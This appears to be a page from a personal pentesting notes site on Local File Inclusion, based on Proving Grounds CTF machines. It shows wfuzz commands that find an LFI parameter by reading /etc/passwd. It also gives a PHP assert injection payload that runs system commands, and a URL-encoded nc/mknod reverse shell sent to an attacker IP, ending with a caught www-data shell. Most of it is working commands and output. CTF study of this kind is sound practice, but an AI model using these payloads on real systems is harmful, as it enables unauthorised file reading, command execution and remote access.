---
layout: default
title: Local File Inclusion
parent: Web Exploits
nav_order: 1
---

# Local File Inclusion

---

## Parameter Discovery with WFUZZ (Simple)

Use wfuzz to fuzz a parameter and test for LFI.

```bash
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh 0 "http://192.168.202.80/console/file.php?FUZZ=../../../../../../../etc/passwd"
```

![fuzz_lfi](../../../../assets/images/ctfs/proving_grounds/ha_natraj/fuzz_lfi.png)

This reveals the parameter _file_.

Confirm LFI vulnerability by displaying _/etc/passwd_

![etc_passwd](../../../../assets/images/ctfs/proving_grounds/ha_natraj/etc_passwd.png)

## Parameter Discovery with WFUZZ (PHPSESSID)

We will do some fuzzing against the site.

First we need to get the session ID from Burp.

![burp2](../../../../assets/images/ctfs/proving_grounds/dc-9/burp2.png)

Now we can run WFUZZ against the _/welcome.php_ page with the _PHPSESSID_ parameter and using \*--hh 963" to ignore output that is 963 bytes.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-9]
└─$ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404 --hh 963 -b "PHPSESSID=3f7m38o92mpldiuu4mug1f18t0" "http://192.168.160.209/welcome.php?FUZZ=../../../../../../../etc/passwd"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.160.209/welcome.php?FUZZ=../../../../../../../etc/passwd
Total requests: 6453

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000002206:   200        85 L     150 W      3316 Ch     "file"

Total time: 0
Processed Requests: 3452
Filtered Requests: 3451
Requests/sec.: 0

```

We have the parameter "file" to use to display _/etc/passwd_

![lfi](../../../../assets/images/ctfs/proving_grounds/dc-9/lfi.png)

## LFI via PHP's 'assert' Options

![index](../../../../assets/images/ctfs/proving_grounds/assertion/index.png)

The URL looks susceptible to LFI, but we get a custom message after a simple test.

![brother](../../../../assets/images/ctfs/proving_grounds/assertion/brother.png)

Reaching the following page from HackTricks there are some _LFI via PHP's 'assert'_ options when the site appears to be filtering traversal strings, such as this site is doing.

[HackTricks File Inclusion Page](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

```bash
http://192.168.232.94/index.php?page=%27%20and%20die(system(%22whoami%22))%20or%20%27
```

![whoami](../../../../assets/images/ctfs/proving_grounds/assertion/whoami.png)

Generate a reverse shell with revshellgen

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/assertion101]
└─$ revshellgen -i 192.168.45.217 -p 9001 -t nc-mknod

[+] Reverse shell command:

rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/assertion101]
└─$ urlencode "rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l"
rm%20%2Ftmp%2Fl%3Bmknod%20%2Ftmp%2Fl%20p%3B%2Fbin%2Fsh%200%3C%2Ftmp%2Fl%20%7C%20nc%20192.168.45.217%209001%201%3E%2Ftmp%2Fl

```

Executing the following payload we get a reverse shell in our netcat listener.

```bash
URL: 192.168.232.94/index.php?page=' and die(system("rm%20%2Ftmp%2Fl%3Bmknod%20%2Ftmp%2Fl%20p%3B%2Fbin%2Fsh%200%3C%2Ftmp%2Fl%20%7C%20nc%20192.168.45.217%209001%201%3E%2Ftmp%2Fl")) or '


┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/assertion101]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.232.94] 59352
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
